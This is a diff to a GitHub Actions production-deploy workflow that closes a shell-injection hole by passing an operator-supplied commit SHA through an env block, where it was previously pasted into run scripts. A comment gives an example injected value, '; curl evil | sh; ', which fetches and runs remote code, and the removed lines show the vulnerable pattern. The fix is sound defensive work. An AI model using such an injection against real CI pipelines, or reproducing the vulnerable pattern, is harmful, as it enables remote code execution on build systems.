@@ -50,6 +50,14 @@ jobs:
     # Environments -> gcp-prod). Protection rules on a private repo need a paid plan; without one
     # this is just a label, and the dispatch trigger is the gate.
     environment: gcp-prod
+    # The operator-supplied SHA reaches the shell ONLY as an environment variable.
+    # `${{ }}` inside a `run:` body is textual substitution performed before the shell parses,
+    # so an input like `; curl evil | sh; ` would execute BEFORE the format check below could
+    # reject it - the validation would be running on a string that had already had its way.
+    # An `env:` block is an expression context: the value is passed, never pasted.
+    env:
+      SHA: ${{ inputs.sha }}
+      PROMOTE_FLAG: ${{ inputs.promote && 1 || 0 }}
     steps:
       # TWO checkouts, and the split is deliberate.
       #
@@ -76,7 +84,6 @@ jobs:
       - name: Verify the SHA is a real, merged commit on main
         run: |
           set -euo pipefail
-          SHA='${{ inputs.sha }}'
           # Reject anything that is not a full SHA before it reaches a git command. A short sha or
           # a branch name would resolve, and then "what is deployed" stops being unambiguous.
           [[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "::error::'$SHA' is not a full 40-character lowercase SHA"; exit 1; }
@@ -104,7 +111,6 @@ jobs:
       - name: Build the image, unless this SHA already has one
         run: |
           set -euo pipefail
-          SHA='${{ inputs.sha }}'
           IMAGE="${REGION}-docker.pkg.dev/${PROJECT_SHARED}/pivota/backend:${SHA}"
           # Rebuilding an existing tag costs ~8 minutes and produces a different image for the same
           # commit. Reusing it is also what makes a rollback fast: the previous SHA is already built.
@@ -124,14 +130,13 @@ jobs:
           # secret mounts exactly as they are. The ported env files this script otherwise needs are
           # git-ignored and generated from `railway variables`, which will not outlive Railway.
           # A config change stays a deliberate human operation.
-          CONFIG=preserve PROMOTE='${{ inputs.promote && 1 || 0 }}' \
-            infra/gcp/deploy_backend.sh prod '${{ inputs.sha }}'
+          CONFIG=preserve PROMOTE="$PROMOTE_FLAG" \
+            infra/gcp/deploy_backend.sh prod "$SHA"
 
       - name: Confirm production is serving the new commit
         if: ${{ inputs.promote }}
         run: |
           set -euo pipefail
-          SHA='${{ inputs.sha }}'
           # Cloud Run reports the traffic split as updated before every instance has rolled, so a
           # single immediate probe can still be answered by the outgoing revision. Poll.
           for i in $(seq 1 20); do
@@ -147,5 +152,5 @@ jobs:
       - name: Candidate summary
         if: ${{ !inputs.promote }}
         run: |
-          echo "::notice::Candidate for ${{ inputs.sha }} passed its health check and is at 0% traffic."
+          echo "::notice::Candidate for $SHA passed its health check and is at 0% traffic."
           echo "Re-run with promote checked to shift traffic."
